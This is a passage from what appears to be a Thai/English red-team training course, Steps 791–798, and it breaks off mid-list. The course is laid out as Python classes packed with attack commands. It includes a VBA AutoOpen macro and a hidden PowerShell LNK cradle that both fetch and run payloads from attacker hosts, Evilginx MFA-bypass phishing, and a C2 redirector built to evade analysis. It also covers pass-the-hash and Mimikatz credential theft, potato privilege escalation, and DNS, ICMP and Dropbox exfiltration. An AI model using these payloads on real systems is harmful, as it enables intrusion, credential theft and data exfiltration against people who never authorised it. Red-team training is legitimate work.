# Part 80: Red Team Operations Planning (Steps 791-800)

## Step 791: Red Team Engagement Scoping and Planning

การวางแผน Red Team engagement อย่างเป็นระบบเพื่อเพิ่มประสิทธิภาพและลดความเสี่ยง

```python
from dataclasses import dataclass, field
from typing import List, Dict, Optional
from datetime import datetime, timedelta
import json

@dataclass
class EngagementScope:
    """Red team engagement scope definition"""
    
    client_name: str = ""
    engagement_type: str = ""  # full-rt, assumed-breach, purple-team
    start_date: str = ""
    end_date: str = ""
    objectives: List[str] = field(default_factory=list)
    in_scope: List[str] = field(default_factory=list)
    out_of_scope: List[str] = field(default_factory=list)
    rules_of_engagement: List[str] = field(default_factory=list)
    
    def standard_roe(self) -> List[str]:
        """Standard rules of engagement"""
        return [
            "No denial of service attacks unless explicitly approved",
            "No destructive attacks on production systems",
            "No modification of data without approval",
            "Stop immediately if critical business impact is detected",
            "Report critical vulnerabilities (RCE, domain admin) within 24 hours",
            "Maintain detailed logs of all actions taken",
            "Emergency contact numbers available at all times",
            "Business hours restrictions if specified",
            "Geographic/network restrictions must be honored",
            "Phishing requires explicit approval per target list"
        ]
    
    def engagement_types(self) -> Dict:
        return {
            "full_red_team": {
                "description": "Blind engagement - Blue Team unaware",
                "duration": "4-12 weeks",
                "objectives": ["Test detection & response", "Achieve crown jewels", "Measure dwell time"]
            },
            "assumed_breach": {
                "description": "Start with foothold already established",
                "duration": "2-4 weeks",
                "objectives": ["Test lateral movement detection", "Privilege escalation", "Data exfiltration"]
            },
            "purple_team": {
                "description": "Collaborative - Blue Team aware and observing",
                "duration": "1-2 weeks",
                "objectives": ["Tune detection rules", "Validate controls", "Transfer knowledge"]
            },
            "adversary_simulation": {
                "description": "Emulate specific threat actor TTPs",
                "duration": "3-8 weeks",
                "objectives": ["Test against APT-specific techniques", "MITRE ATT&CK coverage"]
            }
        }
    
    def define_crown_jewels(self, assets: List[str]) -> List[Dict]:
        """Define target objectives (crown jewels)"""
        crown_jewels = []
        for asset in assets:
            crown_jewels.append({
                "asset": asset,
                "impact": "HIGH",
                "success_criteria": f"Read/modify/exfiltrate: {asset}",
                "verification": "Screenshot + file name + hash"
            })
        return crown_jewels


@dataclass
class ThreatProfile:
    """Define threat actor profile for simulation"""
    
    def nation_state_profiles(self) -> Dict:
        return {
            "APT29_Cozy_Bear": {
                "origin": "Russia (SVR)",
                "targets": ["Government", "Think tanks", "Healthcare", "Energy"],
                "initial_access": ["Spear phishing", "Supply chain", "Valid accounts"],
                "techniques": ["WELLMESS malware", "SUNBURST (SolarWinds)", "MiniDuke"],
                "mitre_groups": "G0016",
                "persistence": ["Registry Run keys", "Scheduled tasks", "COM hijacking"]
            },
            "APT41_Winnti": {
                "origin": "China (MSS)",
                "targets": ["Healthcare", "Telecom", "Finance", "Gaming"],
                "initial_access": ["Exploit public-facing", "Supply chain", "Valid accounts"],
                "techniques": ["PlugX", "Poison Ivy", "ShadowPad"],
                "mitre_groups": "G0096",
                "persistence": ["BITS jobs", "WMI subscriptions", "Bootkit"]
            },
            "Lazarus": {
                "origin": "North Korea (RGB)",
                "targets": ["Financial", "Crypto", "Defense"],
                "initial_access": ["Spear phishing", "Watering hole"],
                "techniques": ["BLINDINGCAN", "HOPLIGHT", "WannaCry"],
                "mitre_groups": "G0032"
            }
        }
    
    def build_attack_plan(self, threat_actor: str) -> Dict:
        return {
            "threat_actor": threat_actor,
            "phases": [
                {"phase": "Reconnaissance", "duration": "Week 1", "tools": ["OSINT", "Active scanning"]},
                {"phase": "Initial Access", "duration": "Week 2", "tools": ["Phishing", "Exploitation"]},
                {"phase": "Execution", "duration": "Week 2-3", "tools": ["Malware execution"]},
                {"phase": "Persistence", "duration": "Week 3", "tools": ["Registry", "Scheduled tasks"]},
                {"phase": "Privilege Escalation", "duration": "Week 3-4", "tools": ["Local exploits", "Misconfigs"]},
                {"phase": "Defense Evasion", "duration": "Ongoing", "tools": ["AV bypass", "Log clearing"]},
                {"phase": "Credential Access", "duration": "Week 4", "tools": ["Mimikatz", "DCSync"]},
                {"phase": "Lateral Movement", "duration": "Week 4-5", "tools": ["Pass-the-hash", "WMI"]},
                {"phase": "Collection", "duration": "Week 5", "tools": ["Data staging"]},
                {"phase": "Exfiltration", "duration": "Week 5-6", "tools": ["DNS tunneling", "HTTPS C2"]}
            ]
        }


if __name__ == '__main__':
    scope = EngagementScope(
        client_name="ACME Corp",
        engagement_type="full_red_team",
        start_date="2024-01-15",
        end_date="2024-03-15"
    )
    
    print("Standard ROE:")
    for roe in scope.standard_roe()[:5]:
        print(f"  - {roe}")
    
    profile = ThreatProfile()
    plan = profile.build_attack_plan("APT29")
    print(f"\nAttack Plan for {plan['threat_actor']}:")
    for phase in plan['phases'][:4]:
        print(f"  [{phase['phase']}] {phase['duration']}")
```

## Step 792: Infrastructure Setup and C2 Framework Deployment

การตั้งค่า Red Team infrastructure โดยใช้ layered redirectors และ C2 frameworks

```python
from dataclasses import dataclass, field
from typing import Dict, List, Optional

@dataclass
class RedTeamInfrastructure:
    """Red team C2 and operational infrastructure"""
    
    def infrastructure_design(self) -> Dict:
        return {
            "architecture": "Layered Infrastructure",
            "tiers": [
                {
                    "tier": 1,
                    "name": "Target Network",
                    "components": ["Victim machines", "Compromised credentials"],
                    "communication": "Beacon to Tier 2"
                },
                {
                    "tier": 2, 
                    "name": "Redirectors",
                    "components": ["Cloud VPS (AWS/Azure/DO)", "Apache/Nginx redirector"],
                    "purpose": "Obscure real C2 IP",
                    "hosting": "Disposable - burned if detected"
                },
                {
                    "tier": 3,
                    "name": "C2 Servers",
                    "components": ["Cobalt Strike teamserver", "Sliver", "Metasploit"],
                    "purpose": "Actual command and control",
                    "hosting": "Never exposed directly"
                },
                {
                    "tier": 4,
                    "name": "Operator Workstations",
                    "components": ["Jump hosts", "VPN", "Parrot OS VMs"],
                    "purpose": "Operator workstations - isolated from C2"
                }
            ]
        }
    
    def cobalt_strike_setup(self) -> Dict:
        return {
            "framework": "Cobalt Strike",
            "components": {
                "teamserver": "Central C2 server (Java)",
                "beacon": "Implant on target machine",
                "client": "Operator GUI (Cobalt Strike.jar)",
                "aggressor_scripts": "Automation and extension framework"
            },
            "setup_commands": [
                "# Generate SSL cert",
                "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes",
                "",
                "# Start teamserver",
                "./teamserver <IP> <password> <malleable_profile>",
                "",
                "# Configure HTTP beacon",
                "# Use malleable C2 profile for traffic masking"
            ],
            "beacon_types": [
                {"type": "HTTP", "use": "Standard C2 over HTTP"},
                {"type": "HTTPS", "use": "Encrypted C2"},
                {"type": "SMB", "use": "Peer-to-peer in internal network"},
                {"type": "DNS", "use": "C2 via DNS queries (stealthy)"},
                {"type": "TCP", "use": "Direct TCP connection"}
            ]
        }
    
    def sliver_setup(self) -> Dict:
        return {
            "framework": "Sliver (BishopFox)",
            "description": "Open-source C2 framework, alternative to Cobalt Strike",
            "setup": [
                "# Download and install",
                "curl https://sliver.sh/install | sudo bash",
                "",
                "# Start server",
                "sliver-server",
                "",
                "# Generate implant",
                "generate --http https://redirector.example.com --os windows --arch amd64 --save /tmp/implant.exe",
                "",
                "# Start HTTP listener",
                "https --lport 443",
                "",
                "# List sessions",
                "sessions"
            ],
            "features": [
                "mTLS, WireGuard, HTTP/S, DNS listeners",
                "Built-in OPSEC features",
                "Multi-operator support",
                "Stager generation",
                "BOF (Beacon Object Files) support"
            ]
        }
    
    def redirector_config(self) -> Dict:
        return {
            "tool": "Apache mod_rewrite Redirector",
            "purpose": "Route legitimate C2 traffic to C2 server, block analysis",
            "config": """
# /etc/apache2/sites-available/redirector.conf

<VirtualHost *:443>
    ServerName redirector.example.com
    SSLEngine on
    SSLCertificateFile /path/to/cert.pem
    SSLCertificateKeyFile /path/to/key.pem
    
    # Block known sandbox/analysis user agents
    RewriteEngine On
    RewriteCond %{HTTP_USER_AGENT} (curl|wget|python|scanner|bot) [NC]
    RewriteRule .* https://www.google.com/ [L,R=302]
    
    # Only allow beacons with specific URI pattern
    RewriteCond %{REQUEST_URI} ^/jquery-[0-9]\.[0-9]\.[0-9]\.min\.js$
    RewriteRule ^(.*)$ https://C2_SERVER_IP:8443$1 [P,L]
    
    # Everything else redirect to legitimate site
    RewriteRule .* https://www.legitimate-site.com/ [L,R=302]
</VirtualHost>
"""
        }


if __name__ == '__main__':
    infra = RedTeamInfrastructure()
    design = infra.infrastructure_design()
    print("Infrastructure tiers:")
    for tier in design['tiers']:
        print(f"  Tier {tier['tier']}: {tier['name']} - {tier.get('purpose', tier.get('communication', ''))}")
    
    sliver = infra.sliver_setup()
    print(f"\nSliver features:")
    for feature in sliver['features']:
        print(f"  - {feature}")
```

## Step 793: OSINT and Target Reconnaissance

การรวบรวม intelligence เกี่ยวกับ target โดยใช้ open-source tools

```python
from dataclasses import dataclass, field
from typing import List, Dict, Optional
import re

@dataclass
class OSINTRecon:
    """Open Source Intelligence gathering for red team"""
    
    target_domain: str = ""
    target_org: str = ""
    findings: Dict = field(default_factory=dict)
    
    def passive_dns_recon(self) -> Dict:
        return {
            "tool": "Passive DNS reconnaissance",
            "commands": [
                f"# Subdomains via amass",
                f"amass enum -passive -d {self.target_domain or 'example.com'} -o subdomains.txt",
                "",
                f"# Certificate transparency logs",
                f"curl 'https://crt.sh/?q=%25.{self.target_domain or 'example.com'}&output=json' | jq '.[].name_value'",
                "",
                f"# DNS brute force",
                f"gobuster dns -d {self.target_domain or 'example.com'} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
                "",
                "# Reverse IP lookup",
                "curl https://api.hackertarget.com/reverseiplookup/?q=<IP>",
                "",
                "# WHOIS",
                f"whois {self.target_domain or 'example.com'}"
            ]
        }
    
    def email_harvesting(self) -> Dict:
        return {
            "tool": "Email harvesting for phishing targets",
            "tools": [
                {
                    "name": "theHarvester",
                    "command": f"theHarvester -d {self.target_domain or 'example.com'} -b all -l 200",
                    "sources": "Google, Bing, LinkedIn, GitHub, Hunter.io"
                },
                {
                    "name": "Hunter.io",
                    "command": f"curl 'https://api.hunter.io/v2/domain-search?domain={self.target_domain or 'example.com'}&api_key=KEY'",
                    "provides": "Email format patterns + individual emails"
                },
                {
                    "name": "LinkedIn scraping",
                    "tool": "linkedin2username",
                    "command": f"python3 linkedin2username.py -u linkedin_user -p 'Target Company' -o {self.target_domain or 'example.com'}"
                }
            ],
            "email_format_check": [
                "first.last@company.com",
                "f.last@company.com",
                "firstlast@company.com",
                "first_last@company.com"
            ]
        }
    
    def technology_fingerprinting(self) -> Dict:
        return {
            "web_stack": [
                "Wappalyzer browser plugin",
                f"whatweb {self.target_domain or 'https://example.com'}",
                f"nmap -sV --script http-headers,http-title {self.target_domain or 'example.com'}",
                "Check response headers (Server, X-Powered-By, X-Frame-Options)"
            ],
            "cloud_assets": [
                "# Find S3 buckets",
                f"bucket_finder -t {self.target_domain or 'example.com'} wordlist.txt",
                f"python3 s3scanner.py {self.target_org or 'targetorg'}",
                "",
                "# Azure blob storage",
                f"for name in {self.target_org or 'targetorg'} {self.target_org or 'targetorg'}-backup {self.target_org or 'targetorg'}-dev; do",
                "  curl -I https://$name.blob.core.windows.net/; done"
            ],
            "github_recon": [
                f"# Search GitHub for org",
                f"gh search code --owner {self.target_org or 'target-org'} 'password' 'api_key' 'secret'",
                "",
                "# GitDumper for exposed .git",
                f"gitdumper.sh https://{self.target_domain or 'example.com'}/.git/ /tmp/gitdump"
            ]
        }
    
    def shodan_queries(self) -> List[str]:
        org = self.target_org or 'Target Organization'
        domain = self.target_domain or 'example.com'
        return [
            f'org:"{org}" port:22',
            f'org:"{org}" http.title:"login"',
            f'org:"{org}" product:"Cisco IOS"',
            f'hostname:{domain} vuln:CVE-2021-44228',  # Log4Shell
            f'org:"{org}" "default password"',
            f'net:<IP_RANGE> port:3389',  # RDP
            f'org:"{org}" port:27017',  # MongoDB
            f'org:"{org}" http.favicon.hash:-335242539',  # Cobalt Strike
        ]


@dataclass
class SocialEngineering:
    """Social engineering pretext development"""
    
    def phishing_pretexts(self) -> List[Dict]:
        return [
            {
                "name": "IT Password Reset",
                "target": "All employees",
                "pretext": "Your password expires in 24 hours",
                "lure": "Fake Office 365 login page"
            },
            {
                "name": "HR Benefits Update",
                "target": "All employees",
                "pretext": "Open enrollment deadline",
                "lure": "Malicious Word doc with macros"
            },
            {
                "name": "IT Security Compliance",
                "target": "Senior management",
                "pretext": "Install required security certificate",
                "lure": "Signed malicious installer"
            },
            {
                "name": "Vendor Invoice",
                "target": "Finance team",
                "pretext": "Invoice requires approval",
                "lure": "Excel with XLM macros"
            }
        ]


if __name__ == '__main__':
    recon = OSINTRecon(target_domain="example.com", target_org="Example Corp")
    
    print("DNS recon commands:")
    for cmd in recon.passive_dns_recon()['commands'][:4]:
        print(f"  {cmd}")
    
    print("\nShodan queries:")
    for query in recon.shodan_queries()[:4]:
        print(f"  {query}")
    
    se = SocialEngineering()
    print("\nPhishing pretexts:")
    for pretext in se.phishing_pretexts():
        print(f"  - {pretext['name']}: {pretext['pretext']}")
```

## Step 794: Initial Access Techniques

เทคนิค Initial Access หลายรูปแบบตาม MITRE ATT&CK TA0001

```python
from dataclasses import dataclass, field
from typing import List, Dict

@dataclass
class InitialAccess:
    """Initial access technique implementations"""
    
    def phishing_infrastructure(self) -> Dict:
        return {
            "email_spoofing_prevention_check": {
                "SPF": "nslookup -type=TXT domain.com | grep v=spf",
                "DMARC": "nslookup -type=TXT _dmarc.domain.com",
                "DKIM": "nslookup -type=TXT selector._domainkey.domain.com"
            },
            "gophish_setup": [
                "# Install GoPhish",
                "wget https://github.com/gophish/gophish/releases/.../gophish-v0.12.1-linux-64bit.zip",
                "unzip gophish*.zip && cd gophish",
                "./gophish  # Default admin:gophish on port 3333",
                "",
                "# Configure:",
                "# 1. Sending profile (SMTP server)",
                "# 2. Landing page (credential harvest or serve payload)",
                "# 3. Email template",
                "# 4. Users & groups",
                "# 5. Campaign"
            ],
            "evilginx_phishing": [
                "# EvilGinx2 - MiTM phishing (bypasses MFA)",
                "./evilginx2 -p ./phishlets",
                "> phishlets hostname office365 attacker.com",
                "> phishlets enable office365",
                "> lures create office365",
                "> lures get-url 0  # Get phishing URL",
                "",
                "# Captures: username, password, AND session cookies"
            ]
        }
    
    def document_payloads(self) -> Dict:
        return {
            "macro_vba": {
                "type": "Word/Excel VBA macro",
                "template": """
Sub AutoOpen()
    Dim strURL As String
    Dim strFile As String
    strURL = "https://attacker.com/payload.exe"
    strFile = Environ("TEMP") & "\\update.exe"
    
    ' Download via XMLHTTP
    Dim oXMLHTTP As Object
    Set oXMLHTTP = CreateObject("MSXML2.XMLHTTP")
    oXMLHTTP.Open "GET", strURL, False
    oXMLHTTP.Send
    
    ' Write to file
    Dim oStream As Object
    Set oStream = CreateObject("ADODB.Stream")
    oStream.Type = 1  ' Binary
    oStream.Open
    oStream.Write oXMLHTTP.ResponseBody
    oStream.SaveToFile strFile, 2
    oStream.Close
    
    ' Execute
    Shell strFile
End Sub
""",
                "bypass": "Use mshta or certutil instead of Shell for AV bypass"
            },
            "excel_xlm": {
                "type": "Excel 4.0 Macro (XLM)",
                "advantage": "Old format, less detected than VBA",
                "steps": [
                    "Right-click sheet tab -> Insert Sheet -> MS Excel 4.0 Macro",
                    "Type formula in cell: =EXEC(\"cmd /c calc.exe\")",
                    "Name cell 'Auto_Open' to execute on open",
                    "Hide the macro sheet"
                ]
            },
            "lnk_payload": {
                "type": "LNK shortcut",
                "command": 'powershell -WindowStyle Hidden -c "IEX (New-Object Net.WebClient).DownloadString(\'http://attacker/payload\')"',
                "creation": "Create via PowerShell or Python (python-lnk library)"
            },
            "iso_container": {
                "type": "ISO/IMG file container",
                "advantage": "Bypasses Mark-of-the-Web (MOTW) security warning",
                "contents": "LNK + DLL/EXE payload inside ISO",
                "create": "mkisofs -o payload.iso -J -r ./payload_dir/"
            }
        }
    
    def drive_by_compromise(self) -> Dict:
        return {
            "technique": "Drive-by Compromise (T1189)",
            "methods": [
                {
                    "name": "Browser exploit kit",
                    "description": "Exploit browser/plugin vulnerabilities",
                    "examples": ["RIG EK", "Fallout EK", "Magnitude EK"]
                },
                {
                    "name": "Watering hole",
                    "description": "Compromise website visited by target",
                    "steps": ["Identify target websites", "Compromise site", "Inject malicious JS", "Serve payload"]
                },
                {
                    "name": "Malvertising",
                    "description": "Inject malicious ads into ad networks",
                    "reach": "Potentially millions of users"
                }
            ]
        }


if __name__ == '__main__':
    access = InitialAccess()
    
    print("EvilGinx2 setup:")
    for cmd in access.phishing_infrastructure()['evilginx_phishing']:
        print(f"  {cmd}")
    
    print("\nDocument payload types:")
    docs = access.document_payloads()
    for name, doc in docs.items():
        print(f"  - {doc['type']}: {doc.get('advantage', doc.get('bypass', ''))}")
```

## Step 795: Lateral Movement Techniques

เทคนิค Lateral Movement ใน Windows domain environment

```python
from dataclasses import dataclass, field
from typing import List, Dict

@dataclass
class LateralMovement:
    """Lateral movement techniques in Windows environments"""
    
    def pass_the_hash(self) -> Dict:
        return {
            "technique": "Pass-the-Hash (PtH)",
            "concept": "Use NTLM hash without knowing plaintext password",
            "requirements": "Local admin on target",
            "tools": [
                "# Impacket smbexec",
                "smbexec.py -hashes :NTHASH domain/user@target",
                "",
                "# Impacket wmiexec",
                "wmiexec.py -hashes :NTHASH domain/user@target",
                "",
                "# CrackMapExec",
                "cme smb <subnet>/24 -u user -H NTHASH --exec-method smbexec -x 'whoami'",
                "",
                "# Metasploit",
                "use exploit/windows/smb/psexec",
                "set SMBPass NTHASH (hash format: LM:NT)"
            ],
            "prevention": [
                "Enable Windows Credential Guard",
                "KB2871997 - restrict privileged account usage",
                "Disable NTLM authentication",
                "Local admin password solution (LAPS)"
            ]
        }
    
    def pass_the_ticket(self) -> Dict:
        return {
            "technique": "Pass-the-Ticket (PtT)",
            "concept": "Inject Kerberos TGT/TGS ticket into session",
            "tools": [
                "# Extract tickets with Mimikatz",
                "sekurlsa::tickets /export",
                "",
                "# Pass ticket",
                "kerberos::ptt ticket.kirbi",
                "",
                "# Rubeus",
                "Rubeus.exe dump /service:cifs",
                "Rubeus.exe ptt /ticket:base64_ticket",
                "",
                "# Impacket",
                "export KRB5CCNAME=ticket.ccache",
                "smbexec.py -k domain/user@target"
            ]
        }
    
    def wmi_lateral_movement(self) -> Dict:
        return {
            "technique": "WMI Lateral Movement",
            "concept": "Use WMI to execute commands on remote host",
            "commands": [
                "# WMIC from CLI",
                "wmic /node:<TARGET> /user:DOMAIN\\user /password:pass process call create 'cmd /c whoami > C:\\output.txt'",
                "",
                "# PowerShell via WMI",
                "$wmi = [wmiclass]\"\\\\<TARGET>\\root\\cimv2:Win32_Process\"",
                "$wmi.Create('cmd /c powershell -enc <b64payload>')",
                "",
                "# Impacket",
                "wmiexec.py domain/user:password@target",
                "",
                "# With Pass-the-Hash",
                "wmiexec.py -hashes :NTHASH domain/user@target 'whoami'"
            ],
            "advantages": ["Uses legitimate WMI infrastructure", "Less suspicious than psexec", "Available on all Windows"]
        }
    
    def psexec_alternatives(self) -> List[Dict]:
        return [
            {
                "method": "SMBExec",
                "tool": "impacket/smbexec.py",
                "mechanism": "Creates service, executes via SMB",
                "traces": "Service creation events (4697)"
            },
            {
                "method": "Scheduled Task",
                "tool": "schtasks /create /s target",
                "mechanism": "Creates and runs scheduled task",
                "traces": "Task scheduler events (4698)"
            },
            {
                "method": "Remote Registry",
                "tool": "reg.exe /s target add ...",
                "mechanism": "Modify registry remotely",
                "traces": "Registry modification events"
            },
            {
                "method": "WinRM/PowerShell Remoting",
                "tool": "Enter-PSSession -ComputerName target",
                "mechanism": "Remote PowerShell via HTTP/S",
                "traces": "WinRM events (6silon), 400/4103)"
            },
            {
                "method": "DCOM",
                "tool": "Invoke-DCOM.ps1",
                "mechanism": "Remote DCOM object instantiation",
                "traces": "Network connections, DCOM events"
            }
        ]


if __name__ == '__main__':
    lateral = LateralMovement()
    
    print("Pass-the-Hash tools:")
    for cmd in lateral.pass_the_hash()['tools'][:6]:
        print(f"  {cmd}")
    
    print("\nLateral movement alternatives:")
    for method in lateral.psexec_alternatives():
        print(f"  {method['method']}: {method['mechanism']}")
```

## Step 796: Data Exfiltration Techniques

เทคนิค Data Exfiltration ผ่านช่องทางต่างๆ

```python
from dataclasses import dataclass, field
from typing import List, Dict, Optional
import base64
import zlib

@dataclass
class DataExfiltration:
    """Data exfiltration techniques and channels"""
    
    def staging_data(self) -> Dict:
        return {
            "technique": "Data Staging before Exfiltration",
            "steps": [
                "1. Identify valuable data (credentials, PII, IP, source code)",
                "2. Compress to reduce size: 7z a -p secret archive.7z /target/data",
                "3. Encrypt to avoid content inspection",
                "4. Split into chunks if needed",
                "5. Stage in writable location (Temp, AppData, C:\\ProgramData)"
            ],
            "compression_encryption": [
                "7z a -mhe=on -p'secret' staged.7z target_dir/",
                "openssl enc -aes-256-cbc -in data.tar -out data.enc -k password",
                "certutil -encode data.bin data.b64  # Base64 encode"
            ]
        }
    
    def exfil_channels(self) -> Dict:
        return {
            "dns": {
                "method": "DNS Tunneling",
                "tool": "dnscat2, iodine, dnscapy",
                "command": [
                    "# Server (attacker)",
                    "dnscat2-server --dns domain=c2.attacker.com",
                    "",
                    "# Client (target)",
                    "dnscat2 c2.attacker.com",
                    "> shell  # Get shell over DNS"
                ],
                "rate": "~10KB/s - slow but stealthy"
            },
            "https": {
                "method": "HTTPS to cloud service",
                "destinations": ["Dropbox API", "Pastebin", "GitHub Gist", "OneDrive", "Google Drive"],
                "python_dropbox": """
import dropbox
import os

def exfil_to_dropbox(file_path: str, dropbox_token: str):
    dbx = dropbox.Dropbox(dropbox_token)
    filename = os.path.basename(file_path)
    
    with open(file_path, 'rb') as f:
        dbx.files_upload(f.read(), f'/{filename}',
                        mode=dropbox.files.WriteMode.overwrite)
    print(f'Exfiltrated: {filename}')
"""
            },
            "icmp": {
                "method": "ICMP Tunneling",
                "tool": "ptunnel, icmptunnel",
                "command": [
                    "# Server",
                    "ptunnel -x password",
                    "# Client",
                    "ptunnel -p attacker.com -lp 8000 -da target.com -dp 22 -x password",
                    "ssh -p 8000 user@localhost"
                ],
                "advantage": "ICMP often allowed outbound, less monitored"
            },
            "steganography": {
                "method": "Hide data in image files",
                "tool": "steghide, OpenStego, LSB insertion",
                "command": [
                    "# Embed data in JPEG",
                    "steghide embed -cf photo.jpg -sf secret.txt -p password",
                    "# Extract",
                    "steghide extract -sf photo.jpg -p password"
                ]
            }
        }
    
    def compress_and_encode(self, data: bytes) -> str:
        """Compress and base64 encode data for exfiltration"""
        compressed = zlib.compress(data, level=9)
        encoded = base64.b64encode(compressed).decode()
        return encoded
    
    def chunked_exfil(self, data: bytes, chunk_size: int = 63) -> List[str]:
        """Split data for DNS subdomain exfiltration"""
        encoded = base64.b32encode(data).decode().rstrip('=').lower()
        chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
        return chunks


if __name__ == '__main__':
    exfil = DataExfiltration()
    
    print("Staging steps:")
    for step in exfil.staging_data()['steps']:
        print(f"  {step}")
    
    print("\nExfiltration channels:")
    channels = exfil.exfil_channels()
    for name, channel in channels.items():
        print(f"  {name}: {channel['method']}")
    
    test_data = b"secret data to exfiltrate"
    encoded = exfil.compress_and_encode(test_data)
    print(f"\nEncoded for DNS exfil: {encoded[:50]}...")
    
    chunks = exfil.chunked_exfil(test_data)
    print(f"DNS chunks ({len(chunks)} total):")
    for chunk in chunks:
        print(f"  {chunk}.attacker.com")
```

## Step 797: Command and Control Techniques

การจัดการ C2 sessions และเทคนิคขั้นสูง

```python
from dataclasses import dataclass, field
from typing import List, Dict, Optional

@dataclass
class C2Management:
    """Advanced C2 management techniques"""
    
    def beacon_management(self) -> Dict:
        return {
            "sleep_timing": {
                "initial": "Short sleep (10-30s) for initial setup",
                "operational": "Long sleep (1-4h) for long-term persistence",
                "jitter": "20-30% jitter to avoid pattern detection"
            },
            "traffic_patterns": [
                "Mimic business hours (8am-6pm) for beaconing",
                "Use weekday-only patterns",
                "Match beacon frequency to traffic baseline",
                "Vary HTTP methods and URIs"
            ],
            "operational_security": [
                "Use different C2 for persistence vs interactive ops",
                "Stage payloads on legitimate sites (paste.ee, GitHub)",
                "Burn infrastructure that gets detected",
                "Use multiple C2 channels (primary + backup)"
            ]
        }
    
    def cobalt_strike_commands(self) -> Dict:
        return {
            "basic": [
                "help          - list commands",
                "sleep 300 30  - sleep 300s with 30% jitter",
                "getuid        - current user",
                "getsystem     - attempt privilege escalation",
                "ps            - process list",
                "inject <pid>  - inject into process",
                "migrate <pid> - migrate to process"
            ],
            "post_exploitation": [
                "hashdump      - dump local hashes",
                "logonpasswords - mimikatz sekurlsa::logonpasswords",
                "dcsync <user> - DCSync attack",
                "golden ticket  - Mimikatz golden ticket",
                "jump psexec64 <target> <listener> - lateral movement",
                "jump winrm64 <target> <listener>  - WinRM lateral"
            ],
            "pivoting": [
                "socks 1080    - SOCKS4a proxy through beacon",
                "rportfwd 8443 internal-host 443  - reverse port forward",
                "connect <host> <port>  - connect to peer beacon (SMB)"
            ]
        }
    
    def aggressor_script_example(self) -> str:
        return '''
# Cobalt Strike Aggressor Script - Auto-run commands on beacon callback
# Run: load /path/to/script.cna in Cobalt Strike client

on beacon_initial {
    # When new beacon checks in, automatically:
    
    # 1. Sleep with jitter
    beacon_command($1, "sleep 3600 30");
    
    # 2. Get system info
    beacon_command($1, "getuid");
    beacon_command($1, "sysinfo");
    
    # 3. Check if admin
    beacon_command($1, "getprivs");
    
    # 4. Run setup (keylogger, screenshot)
    # beacon_command($1, "keylogger");
    
    blog($1, "\u26a0\ufe0f New Beacon! Auto-setup complete.");
}

alias myhelp {
    blog($1, "Custom help text here");
}
'''


@dataclass
class PivotingTechniques:
    """Network pivoting for reaching internal segments"""
    
    def pivoting_methods(self) -> List[Dict]:
        return [
            {
                "method": "SSH Tunneling",
                "dynamic": "ssh -D 1080 user@pivot  # SOCKS5 proxy",
                "local": "ssh -L 8443:internal:443 user@pivot",
                "remote": "ssh -R 9090:localhost:9090 user@pivot"
            },
            {
                "method": "Chisel",
                "server": "./chisel server -p 8000 --reverse",
                "client": "./chisel client attacker:8000 R:socks",
                "use": "proxychains curl http://internal.host/"
            },
            {
                "method": "Ligolo-ng",
                "advantage": "TUN interface - no proxychains needed",
                "server": "./proxy -selfcert -laddr 0.0.0.0:11601",
                "agent": "./agent -connect attacker:11601 -ignore-cert",
                "setup": "ip route add 192.168.0.0/24 dev ligolo"
            },
            {
                "method": "Metasploit route",
                "command": "route add <subnet> <session_id>",
                "use": "After adding route, all MSF modules reach internal net"
            }
        ]


if __name__ == '__main__':
    c2 = C2Management()
    print("Beacon management patterns:")
    for pattern in c2.beacon_management()['traffic_patterns']:
        print(f"  - {pattern}")
    
    print("\nCobalt Strike pivoting:")
    for cmd in c2.cobalt_strike_commands()['pivoting']:
        print(f"  {cmd}")
    
    pivot = PivotingTechniques()
    print("\nPivoting methods:")
    for method in pivot.pivoting_methods():
        print(f"  {method['method']}: {method.get('dynamic', method.get('server', ''))}")
```

## Step 798: Post-Exploitation and Privilege Escalation

เทคนิค Post-Exploitation และการยกระดับสิทธิ์

```python
from dataclasses import dataclass, field
from typing import List, Dict

@dataclass
class PostExploitation:
    """Post-exploitation techniques after initial access"""
    
    def windows_privesc_enum(self) -> Dict:
        return {
            "tool": "WinPEAS - Windows Privilege Escalation Awesome Script",
            "command": "winpeas.exe quiet > winpeas_output.txt",
            "categories": [
                "System info (OS, hotfixes, architecture)",
                "Current user privileges (SeImpersonatePrivilege, etc.)",
                "Credential files (SAM, SYSTEM, unattend.xml)",
                "Scheduled tasks (writable paths, SYSTEM tasks)",
                "Services (unquoted paths, weak permissions)",
                "Registry (AlwaysInstallElevated, AutoRun)",
                "Network (listening ports, ARP cache)",
                "Installed software and versions"
            ],
            "key_checks": [
                "# Unquoted service paths",
                'wmic service get name,pathname | findstr /i /v "C:\\Windows" | findstr /i /v """',
                "",
                "# AlwaysInstallElevated",
                "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
                "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
                "",
                "# SeImpersonatePrivilege",
                "whoami /priv | findstr Impersonate"
            ]
        }
    
    def seimpersonate_exploit(self) -> Dict:
        return {
            "privilege": "SeImpersonatePrivilege",
            "impact": "Escalate to SYSTEM from service account",
            "tools": [
                {
                    "name": "JuicyPotato",
                    "command": "JuicyPotato.exe -l 1337 -c '{clsid}' -p cmd.exe -a '/c whoami > C:\\output.txt' -t *",
                    "requirement": "Windows < Server 2019"
                },
                {
                    "name": "RoguePotato",
                    "command": "RoguePotato.exe -r attacker_ip -e 'cmd.exe /c whoami > C:\\output.txt' -l 9999",
                    "requirement": "Needs port forward from attacker"
                },
                {
                    "name": "PrintSpoofer",
                    "command": "PrintSpoofer.exe -c cmd.exe -i",
                    "requirement": "Windows 10/Server 2016-2019"
                },
                {
                    "name": "GodPotato",
                    "command": 'GodPotato.exe -cmd "cmd /c whoami"',
                    "requirement": "Works on Windows 10-11, Server 2012-2022"
                }
            ]
        }
    
    def linux_privesc_enum(self) -> Dict:
        return {
            "tool": "LinPEAS",
            "command": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
            "sudo_check": "sudo -l  # What can current user run as sudo?",
            "suid_check": "find / -perm -u=s -type f 2>/dev/null",
            "cron_check": "cat /etc/crontab; ls -la /etc/cron*",
            "writable_paths": "find / -writable -type f 2>/dev/null | grep -v proc",
            "capabilities": "getcap -r / 2>/dev/null",
            "nfs_check": "cat /etc/exports  # no_root_squash = privilege escalation",
            "common_exploits": [
